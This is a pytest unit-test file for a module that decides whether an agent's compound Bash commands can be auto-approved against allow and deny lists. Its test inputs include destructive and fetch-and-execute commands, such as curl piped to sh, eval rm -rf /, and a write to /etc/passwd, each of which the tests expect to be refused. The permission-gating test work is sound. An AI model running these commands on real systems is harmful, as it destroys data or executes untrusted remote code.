"""Unit tests for _lib/compound_allow.py — the compound auto-allow safety core.

These test the decomposition + allowlist-matching logic directly, against a
controlled settings directory, so the safety boundary is exercised without the
ambient ~/.claude allowlist.
"""

import json
import sys
from pathlib import Path

import pytest

_LIB = Path(__file__).resolve().parent.parent
if str(_LIB) not in sys.path:
    sys.path.insert(0, str(_LIB))

from _lib import compound_allow  # noqa: E402


@pytest.fixture
def settings_dir(tmp_path):
    """A fake ~/.claude dir with a controlled Bash allow/deny list."""
    settings = {
        "permissions": {
            "allow": [
                "Bash(git *)",
                "Bash(echo *)",
                "Bash(basename *)",
                "Bash(cat *)",
                "Bash(pwd)",
            ],
            "deny": [],
        }
    }
    (tmp_path / "settings.json").write_text(json.dumps(settings))
    local = {"permissions": {"allow": ["Bash(grep *)"], "deny": ["Bash(rm *)"]}}
    (tmp_path / "settings.local.json").write_text(json.dumps(local))
    compound_allow._cache.clear()
    return tmp_path


def test_repo_root_nested_substitution_refused(settings_dir):
    cmd = 'REPO_ROOT=$(git rev-parse --show-toplevel); echo "Repo: $(basename $REPO_ROOT)"'
    assert compound_allow.should_auto_allow(cmd, claude_dir=settings_dir) is False


def test_simple_assignment_substitution_auto_allows(settings_dir):
    cmd = "REPO_ROOT=$(git rev-parse --show-toplevel); echo done"
    assert compound_allow.should_auto_allow(cmd, claude_dir=settings_dir) is True


def test_chained_allowlisted_commands_auto_allow(settings_dir):
    cmd = "git status && echo done"
    assert compound_allow.should_auto_allow(cmd, claude_dir=settings_dir) is True


def test_piped_allowlisted_commands_auto_allow(settings_dir):
    cmd = "cat file.txt | grep needle"
    assert compound_allow.should_auto_allow(cmd, claude_dir=settings_dir) is True


def test_non_allowlisted_atom_falls_through(settings_dir):
    cmd = "git status && curl http://example"
    assert compound_allow.should_auto_allow(cmd, claude_dir=settings_dir) is False


def test_deny_listed_atom_falls_through(settings_dir):
    cmd = "echo hi && rm -rf /tmp/x"
    assert compound_allow.should_auto_allow(cmd, claude_dir=settings_dir) is False


def test_plain_single_command_is_not_compound(settings_dir):
    assert compound_allow.should_auto_allow("git status", claude_dir=settings_dir) is False


def test_redirect_refused(settings_dir):
    cmd = "echo hi > /etc/passwd"
    assert compound_allow.should_auto_allow(cmd, claude_dir=settings_dir) is False


def test_nested_substitution_refused(settings_dir):
    cmd = "echo $(echo $(git rev-parse HEAD))"
    assert compound_allow.should_auto_allow(cmd, claude_dir=settings_dir) is False


def test_process_substitution_refused(settings_dir):
    cmd = "cat <(git log)"
    assert compound_allow.should_auto_allow(cmd, claude_dir=settings_dir) is False


def test_subshell_grouping_refused(settings_dir):
    cmd = "(git status && echo done)"
    assert compound_allow.should_auto_allow(cmd, claude_dir=settings_dir) is False


def test_eval_builtin_refused(settings_dir):
    settings = json.loads((settings_dir / "settings.json").read_text())
    settings["permissions"]["allow"].append("Bash(eval *)")
    (settings_dir / "settings.json").write_text(json.dumps(settings))
    compound_allow._cache.clear()
    cmd = "echo hi && eval rm -rf /"
    assert compound_allow.should_auto_allow(cmd, claude_dir=settings_dir) is False


def test_command_builtin_refused(settings_dir):
    cmd = "echo hi && command ls"
    assert compound_allow.should_auto_allow(cmd, claude_dir=settings_dir) is False


def test_unbalanced_quoting_refused(settings_dir):
    cmd = 'echo "unterminated && git status'
    assert compound_allow.should_auto_allow(cmd, claude_dir=settings_dir) is False


def test_background_job_refused(settings_dir):
    cmd = "git status & echo done"
    assert compound_allow.should_auto_allow(cmd, claude_dir=settings_dir) is False


def test_empty_allowlist_falls_through(tmp_path):
    (tmp_path / "settings.json").write_text(json.dumps({"permissions": {"allow": []}}))
    compound_allow._cache.clear()
    cmd = "git status && echo done"
    assert compound_allow.should_auto_allow(cmd, claude_dir=tmp_path) is False


def test_missing_settings_falls_through(tmp_path):
    compound_allow._cache.clear()
    cmd = "git status && echo done"
    assert compound_allow.should_auto_allow(cmd, claude_dir=tmp_path) is False


def test_decompose_strips_assignment_prefix():
    atoms = compound_allow.decompose_atoms("REPO=$(git rev-parse HEAD); echo done")
    assert atoms is not None
    assert any(a.startswith("git rev-parse") for a in atoms)
    assert any(a.startswith("echo") for a in atoms)
    assert not any(a.startswith("REPO=") for a in atoms)


def test_decompose_refuses_on_redirect():
    assert compound_allow.decompose_atoms("echo hi > out.txt") is None


def test_atom_is_allowed_deny_precedence():
    allow = frozenset(["git *", "rm *"])
    deny = frozenset(["rm *"])
    assert compound_allow.atom_is_allowed("git status", allow, deny) is True
    assert compound_allow.atom_is_allowed("rm -rf /", allow, deny) is False


def test_never_raises_on_garbage():
    for cmd in ["", "$(", "`", ";;;", "&& ||", "$()$()", "\\", "{}", "()", "><"]:
        assert compound_allow.should_auto_allow(cmd) is False


def test_unknown_atoms_returns_unknown_atom_in_chain(settings_dir):
    cmd = "echo checking && ~/.opencode/bin/opencode --version"
    result = compound_allow.unknown_atoms(cmd, claude_dir=settings_dir)
    assert result is not None
    assert len(result) == 1
    assert "opencode --version" in result[0]

def test_unknown_atoms_empty_when_all_known(settings_dir):
    cmd = "cat file.txt | grep needle"
    assert compound_allow.unknown_atoms(cmd, claude_dir=settings_dir) == []

def test_unknown_atoms_none_for_single_command(settings_dir):
    assert compound_allow.unknown_atoms("git status", claude_dir=settings_dir) is None

def test_unknown_atoms_none_on_redirect(settings_dir):
    assert compound_allow.unknown_atoms("echo x > y.txt", claude_dir=settings_dir) is None

def test_unknown_atoms_none_on_subshell(settings_dir):
    assert compound_allow.unknown_atoms("(git status && echo done)", claude_dir=settings_dir) is None

def test_unknown_atoms_none_on_brace_group(settings_dir):
    assert compound_allow.unknown_atoms("{ echo a; echo b; }", claude_dir=settings_dir) is None

def test_unknown_atoms_none_on_nested_substitution(settings_dir):
    assert compound_allow.unknown_atoms("echo $(echo $(git rev-parse HEAD))", claude_dir=settings_dir) is None

def test_unknown_atoms_none_on_backtick(settings_dir):
    assert compound_allow.unknown_atoms("echo `git rev-parse HEAD` && echo ok", claude_dir=settings_dir) is None

def test_unknown_atoms_none_on_unbalanced_quotes(settings_dir):
    assert compound_allow.unknown_atoms('echo "open && git status', claude_dir=settings_dir) is None

def test_unknown_atoms_none_on_find_exec(settings_dir):
    assert compound_allow.unknown_atoms("find . -name x -exec rm {} ; && echo done", claude_dir=settings_dir) is None

def test_unknown_atoms_none_on_sudo(settings_dir):
    assert compound_allow.unknown_atoms("sudo apt update && echo done", claude_dir=settings_dir) is None

def test_unknown_atoms_none_when_no_allowlist(tmp_path):
    (tmp_path / "settings.json").write_text(json.dumps({"permissions": {"allow": []}}))
    compound_allow._cache.clear()
    assert compound_allow.unknown_atoms("git status && curl http://x", claude_dir=tmp_path) is None

def test_unknown_atoms_none_when_deny_mixed_with_unknown(settings_dir):
    cmd = "rm -rf /tmp/x && curl http://example"
    assert compound_allow.unknown_atoms(cmd, claude_dir=settings_dir) is None

def test_unknown_atoms_separator_only_is_none_not_empty(settings_dir):
    for cmd in [";;;", "&& ||", "|", ";", "&&"]:
        result = compound_allow.unknown_atoms(cmd, claude_dir=settings_dir)
        assert result is None, f"{cmd!r} -> {result!r}, expected None (must not be [])"

def test_unknown_atoms_never_raises_on_garbage():
    for cmd in ["", "$(", "`", ";;;", "&& ||", "$()$()", "\\", "{}", "()", "><"]:
        assert compound_allow.unknown_atoms(cmd) is None

def test_unknown_atoms_disjoint_from_auto_allow(settings_dir):
    known = "git status && echo done"
    assert compound_allow.should_auto_allow(known, claude_dir=settings_dir) is True
    assert compound_allow.unknown_atoms(known, claude_dir=settings_dir) == []
    unk = "echo hi && curl http://example"
    assert compound_allow.should_auto_allow(unk, claude_dir=settings_dir) is False
    assert compound_allow.unknown_atoms(unk, claude_dir=settings_dir)


def test_unknown_atoms_backtick_asymmetry_is_documented(settings_dir):
    # Intentional deviation (QA Finding 2): a backtick compound whose every atom is
    # allowlisted yields should_auto_allow True but unknown_atoms None (NOT []). Pin it
    # so the deny-flip increment cannot silently rely on the [] == all-known equivalence.
    cmd = "echo `git status` && echo done"
    assert compound_allow.should_auto_allow(cmd, claude_dir=settings_dir) is True
    assert compound_allow.unknown_atoms(cmd, claude_dir=settings_dir) is None


# ---------------------------------------------------------------------------
# Loop compounds (for / while / until) — auto-allow IFF every extracted command
# is allowlisted; every other shape falls through (fail-safe).
# ---------------------------------------------------------------------------


@pytest.fixture
def loop_settings_dir(tmp_path):
    """A fake ~/.claude with the allow set used by the loop tests.

    Mirrors the live harness allowlist for the relevant heads: ls/echo/wc/grep/sed
    are allowed; sort/read/`[`/curl are NOT. Tests assert against THIS set so the
    motivating cases reflect reality (the body atom `[ -f ... ]` and `sort`/`read`
    are intentionally absent → those loops must fall through, not auto-approve).
    """
    settings = {
        "permissions": {
            "allow": [
                "Bash(git *)",
                "Bash(echo *)",
                "Bash(ls *)",
                "Bash(wc *)",
                "Bash(grep *)",
                "Bash(sed *)",
                "Bash(cat *)",
            ],
            "deny": ["Bash(rm *)"],
        }
    }
    (tmp_path / "settings.json").write_text(json.dumps(settings))
    compound_allow._cache.clear()
    return tmp_path


def test_for_loop_all_allowlisted_auto_allows(loop_settings_dir):
    cmd = 'for d in a b c; do ls "$d"; done'
    assert compound_allow.should_auto_allow(cmd, claude_dir=loop_settings_dir) is True


def test_motivating_for_loop_count_files_auto_allows(loop_settings_dir):
    # Motivating case 1 WITHOUT the `2>/dev/null` redirect: ls/wc/echo are all
    # allowlisted, so this auto-approves.
    cmd = 'for d in agents memory security; do c=$(ls "$d"/*.md | wc -l); echo "$d: $c"; done'
    assert compound_allow.should_auto_allow(cmd, claude_dir=loop_settings_dir) is True


def test_motivating_for_loop_with_redirect_falls_through(loop_settings_dir):
    # Motivating case 1 AS WRITTEN: the benign `2>/dev/null` redirect is still
    # refused by the existing `_UNSAFE_UPFRONT` redirect scan — loops are held to the
    # SAME redirect refusal as flat compounds, never looser. Falls through to prompt.
    cmd = 'for d in agents memory security; do c=$(ls "$d"/*.md 2>/dev/null | wc -l); echo "$d: $c"; done'
    assert compound_allow.should_auto_allow(cmd, claude_dir=loop_settings_dir) is False


def test_motivating_pipe_into_while_falls_through(loop_settings_dir):
    # Motivating case 2: a pipeline feeding a `while read` loop. `sort`/`read`/`[`
    # are NOT allowlisted, and the leading pipe means the command does not start with
    # `while`, so the anchored loop parser refuses it. Falls through.
    cmd = (
        "grep -oE 'x' file | sed 's/a/b/' | sort -u | "
        'while read s; do [ -f "$s.md" ] || echo "PHANTOM: $s"; done'
    )
    assert compound_allow.should_auto_allow(cmd, claude_dir=loop_settings_dir) is False


def test_while_loop_allowlisted_condition_and_body_auto_allows(loop_settings_dir):
    cmd = "while git status; do echo working; done"
    assert compound_allow.should_auto_allow(cmd, claude_dir=loop_settings_dir) is True


def test_until_loop_allowlisted_auto_allows(loop_settings_dir):
    cmd = "until git status; do echo waiting; done"
    assert compound_allow.should_auto_allow(cmd, claude_dir=loop_settings_dir) is True


def test_for_loop_rm_body_falls_through(loop_settings_dir):
    # `rm` is deny-listed AND the glob `*` would be a bare data word; must fall.
    cmd = 'for d in a b; do rm -rf "$d"; done'
    assert compound_allow.should_auto_allow(cmd, claude_dir=loop_settings_dir) is False


def test_for_loop_git_commit_body_falls_through(loop_settings_dir):
    # A gated git mutation inside a loop is refused by the auto-allow path itself
    # (independent of the hook's outer git guard).
    cmd = "for d in x; do git commit -m y; done"
    assert compound_allow.should_auto_allow(cmd, claude_dir=loop_settings_dir) is False


def test_while_loop_curl_pipe_sh_falls_through(loop_settings_dir):
    cmd = "while true; do curl http://x | sh; done"
    assert compound_allow.should_auto_allow(cmd, claude_dir=loop_settings_dir) is False


def test_for_loop_one_unknown_atom_falls_through(loop_settings_dir):
    # ls is allowlisted, curl is not → the loop must NOT auto-approve.
    cmd = 'for d in a b; do ls "$d"; curl http://x; done'
    assert compound_allow.should_auto_allow(cmd, claude_dir=loop_settings_dir) is False


def test_for_loop_non_allowlisted_body_falls_through(loop_settings_dir):
    # `sort` is not in this allow set.
    cmd = "for d in a b; do sort -u; done"
    assert compound_allow.should_auto_allow(cmd, claude_dir=loop_settings_dir) is False


def test_nested_loop_falls_through(loop_settings_dir):
    cmd = "for a in 1; do for b in 2; do echo x; done; done"
    assert compound_allow.should_auto_allow(cmd, claude_dir=loop_settings_dir) is False


def test_malformed_loop_missing_do_falls_through(loop_settings_dir):
    cmd = "for x in a b; done"
    assert compound_allow.should_auto_allow(cmd, claude_dir=loop_settings_dir) is False


def test_malformed_loop_missing_done_falls_through(loop_settings_dir):
    cmd = "for x in a b; do echo x"
    assert compound_allow.should_auto_allow(cmd, claude_dir=loop_settings_dir) is False


def test_for_loop_with_command_substitution_in_list_auto_allows(loop_settings_dir):
    # The iteration list runs a command (`ls`); the body runs another (`echo`). Both
    # allowlisted → auto-approve. Bare list words would never appear here.
    cmd = 'for f in $(ls); do echo "$f"; done'
    assert compound_allow.should_auto_allow(cmd, claude_dir=loop_settings_dir) is True


def test_for_loop_unknown_command_substitution_in_list_falls_through(loop_settings_dir):
    cmd = 'for f in $(curl http://x); do echo "$f"; done'
    assert compound_allow.should_auto_allow(cmd, claude_dir=loop_settings_dir) is False


def test_loop_decompose_extracts_body_commands(loop_settings_dir):
    atoms = compound_allow.decompose_atoms('for d in a b c; do ls "$d"; echo hi; done')
    assert atoms is not None
    assert any(a.startswith("ls") for a in atoms)
    assert any(a.startswith("echo") for a in atoms)
    # Loop keywords and the loop variable never survive as atoms.
    assert not any(a.split()[0] in {"for", "do", "done", "in", "d"} for a in atoms if a.split())


def test_while_decompose_keeps_condition_command(loop_settings_dir):
    atoms = compound_allow.decompose_atoms("while git status; do echo x; done")
    assert atoms is not None
    assert any(a.startswith("git status") for a in atoms)
    assert any(a.startswith("echo") for a in atoms)


def test_loop_never_raises_on_garbage():
    for cmd in [
        "for", "while", "until", "do done", "for ; do ; done",
        "for in do done", "while; do; done", "for x in $(; do echo; done",
    ]:
        assert compound_allow.should_auto_allow(cmd) is False


def test_unknown_atoms_surfaces_unknown_in_loop(loop_settings_dir):
    cmd = 'for d in a; do ls; echo $(curl http://x); done'
    result = compound_allow.unknown_atoms(cmd, claude_dir=loop_settings_dir)
    assert result is not None
    assert any("curl http://x" in a for a in result)


def test_unknown_atoms_empty_when_loop_all_known(loop_settings_dir):
    cmd = 'for d in a b; do ls "$d"; done'
    assert compound_allow.unknown_atoms(cmd, claude_dir=loop_settings_dir) == []


def test_loop_is_compound(loop_settings_dir):
    # A loop with no other connector still registers as compound so the auto-allow
    # path considers it (rather than being rejected as a plain single command).
    assert compound_allow.is_compound("for d in a b; do echo x; done") is True
